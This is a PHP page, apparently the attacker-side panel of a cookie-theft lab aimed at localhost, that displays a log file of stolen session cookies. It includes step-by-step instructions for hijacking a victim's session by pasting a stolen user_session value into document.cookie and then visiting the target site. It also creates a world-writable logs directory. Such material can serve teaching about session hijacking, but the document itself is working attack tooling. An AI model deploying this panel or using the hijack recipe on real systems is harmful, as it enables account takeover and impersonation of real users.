<?php
// Create logs directory if it doesn't exist
if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
}

$logFile = 'logs/stolen_cookies.log';
$logs = file_exists($logFile) ? file_get_contents($logFile) : 'No cookies stolen yet.';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Stolen Cookies Log</title>
    <style>
        body { 
            font-family: monospace; 
            padding: 20px; 
            background: #f4f4f4;
        }
        h1 { 
            color: #333;
            text-align: center;
        }
        pre { 
            background: #fff; 
            padding: 15px; 
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow-x: auto;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .instructions {
            background: #e8f5e9;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        code {
            background: #f5f5f5;
            padding: 2px 5px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Stolen Cookies Log</h1>
        
        <div class="instructions">
            <h3>How to use stolen cookies:</h3>
            <ol>
                <li>Copy a user_session value from the log below</li>
                <li>Open a new private/incognito window</li>
                <li>Open browser dev tools (F12)</li>
                <li>In the Console tab, paste:
                    <br><code>document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/"</code>
                </li>
                <li>Navigate to <a href="http://localhost:8080" target="_blank">http://localhost:8080</a></li>
                <li>You should now be logged in as the victim</li>
            </ol>
        </div>
        
        <pre><?php echo htmlspecialchars($logs); ?></pre>
    </div>
</body>
</html> 